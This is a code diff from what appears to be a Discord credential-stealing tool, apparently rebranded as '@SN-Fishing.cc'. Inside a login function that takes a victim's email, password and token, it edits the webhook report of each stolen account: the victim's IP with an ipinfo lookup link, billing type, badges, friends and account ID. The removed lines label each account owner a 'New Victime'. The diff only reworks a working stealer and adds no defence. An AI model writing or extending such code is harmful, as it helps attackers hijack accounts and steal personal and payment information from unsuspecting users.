@@ -625,13 +625,18 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<a:satanist:802503618972483615> Badges:',
+            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
+            value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
+            inline: true,
+          },
+          {
+            name: '<:1205bluepawprints:985668463899050014> @SN - Badges Type:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Billing:',
-            value: `**${billing}**`,
+            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing Type:',
+            value: `${billing}`,
             inline: true,
           },
           {
@@ -639,22 +644,17 @@ const login = async (email, password, token) => {
             value: `\`${friends}\``,
             inline: true,
           },
-          {
-            name: '<:944007233820307467:959785232037470208> IP:',
-            value: `\`${config.ip}\``,
-            inline: true,
-          },
         ],
         author: {
-          name: "New Victime 👀 is " + json.username +"#" + json.discriminator + " - " +"("+json.id+")",
+          name: json.username +"#" + json.discriminator + " - " +"("+json.id+")",
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
          },
         footer: {
-          text: 'BulkFA',
+          text: "@SN-Fishing.cc 🐟",
         },
-        thumbnail: {
-          url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
-        },
+//         thumbnail: {
+//           url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
+//         },
       },
     ],
   };
